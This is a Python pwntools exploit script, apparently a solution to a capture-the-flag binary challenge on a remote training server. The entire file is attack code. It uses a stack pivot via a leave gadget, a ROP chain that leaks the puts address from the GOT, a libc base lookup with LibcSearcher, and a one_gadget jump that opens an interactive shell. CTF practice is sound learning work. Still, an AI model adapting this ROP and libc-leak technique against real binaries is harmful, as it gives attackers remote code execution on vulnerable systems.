from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 29767)
elf = ELF('./pwn')

addrsp_8_ret = 0x4004c5
pop3_ret = 0x4006ff
poprdi_ret = 0x400703
poprsi_r15_ret = 0x400701
gadget = 0x4006FA
one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

payload = cyclic(0x60)
payload += p64(0x601080 - 8 + 0xA0)    # new ebp
payload += p64(0x400699)    # leave

io.sendafter(b'Tell me what you want\n', payload)

payload = cyclic(0xA0)
payload += p64(poprdi_ret)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(poprdi_ret)
payload += p64(0)
payload += p64(poprsi_r15_ret)
payload += p64(0x601080 + 0x48 + 0xA0)
payload += p64(0xdeadbeef)
payload += p64(elf.plt['read'])
io.sendafter(b'stack now!\n', payload)
puts = u64(io.recv(6) + b'\x00\x00')

libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
payload = p64(base + one_gadgets[3])

io.send(payload)
io.interactive()